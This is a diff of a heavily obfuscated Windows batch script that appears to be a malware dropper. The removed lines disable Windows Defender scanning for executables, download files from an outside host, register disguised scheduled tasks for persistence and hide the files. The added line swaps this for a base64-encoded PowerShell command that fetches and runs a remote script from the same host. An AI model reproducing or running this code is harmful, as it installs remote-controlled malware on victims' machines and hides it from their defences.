@@ -41,6 +41,7 @@ set xxxxzaaaazxzxzxz=ask
 set aaxaaaaxaaaaaxxx=ea
 set zzxaaaaxaxxxxxaa=dhe
 set xzzzzzzzxaxzxzxx=%USERPROFILE%
+set xxzxczczzzzavvvv=edc
 
 
 
@@ -78,35 +79,8 @@ Fo%zzxaaaaxaxxxxxaa%lpeR%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%
     pushd "%CD%"
     CD /D "%~dp0"
 
-%xzzxzxzxzxzxzxzx%WER%zzxxzxzxxxzxzxxx%ll%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx% -c "%xzzxzxzxzxxxxxzz%-MpP%xzxzxzzxzxzxzxzx%Fe%xzxzxzzxzxzxzxzx%nce -%xxxxzzzzxxxzxzxz%clusion%xxxxzzzzxxxzxzxz%tension "%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%""
-
-md %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e
-md %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f
+%xzzxzxzxzxzxzxzx%wer%zzxxzxzxxxzxzxxx%ll%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx% -encod%xxzxczczzzzavvvv%ommand aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAcwBhAG0AeQAxADEALgBjAG8AbQAvAGMAbwBuAGYAaQBnAC4AcABzADEAJwApACkA
 
 
-
-timeout /T 1
-
-%xzzxzxzxzxzxzxzx%WER%zzxxzxzxxxzxzxxx%ll%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx% -c (New-Ob%zzzzzxxxxzxzxzxz%t System%zxxxzxzxzxxzxzxx%Net%zxxxzxzxzxxzxzxx%W%xxxzzzxxxzzzxxxx%lient)%zxxxzxzxzxxzxzxx%Do%xxzxzxxxxxxxzzzz%oadF%xxzxzxzxzxzxzxxx%e('h%zzzzzzzzzxxxxxxx%p://asamy11%zxxxzxzxzxxzxzxx%com/cp%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%','%xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%')
-
-timeout /T 1
-
-%xzzxzxzxzxzxzxzx%WER%zzxxzxzxxxzxzxxx%ll%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx% -c (New-Ob%zzzzzxxxxzxzxzxz%t System%zxxxzxzxzxxzxzxx%Net%zxxxzxzxzxxzxzxx%W%xxxzzzxxxzzzxxxx%lient)%zxxxzxzxzxxzxzxx%Do%xxzxzxxxxxxxzzzz%oadF%xxzxzxzxzxzxzxxx%e('h%zzzzzzzzzxxxxxxx%p://asamy11%zxxxzxzxzxxzxzxx%com/sv%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%','%xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%')
-
-timeout /T 1
-
-
-%xxzxzxzxzxzaxzxa%htasks /create /%xxzxzxzxzxzaxzxa% ONL%xxaxaxaxxzxzxzxz%N /%xxxxzaszxzxzxzxz% "SystemRegenerate" /it /rl "LIMITED" /tr "%xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%"
-
-%xxzxzxzxzxzaxzxa%htasks /create /%xxzxzxzxzxzaxzxa% minute /mo 10 /%xxxxzaszxzxzxzxz% "SystemBackup" /rl "LIMITED" /tr "%xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%"
-
-
-a%xzxzxzxzxzxzxazx% +S +H %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e
-a%xzxzxzxzxzxzxazx% +S +H %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%
-a%xzxzxzxzxzxzxazx% +S +H %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f
-a%xzxzxzxzxzxzxazx% +S +H %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\f\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%
-start %xxzxzxzxxzzzzzzz%\f%xxzxzxzxzxzxzxxx%e\sv%xxxzxzxzxzxzxazz%st%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%
-timeout /T 1
-tas%xxxzzzzzxxxzzzzz%ll /F /IM cmd%zxxxzxzxzxxzxzxx%e%xxxzxxxxzzzzxxxx%
 
 
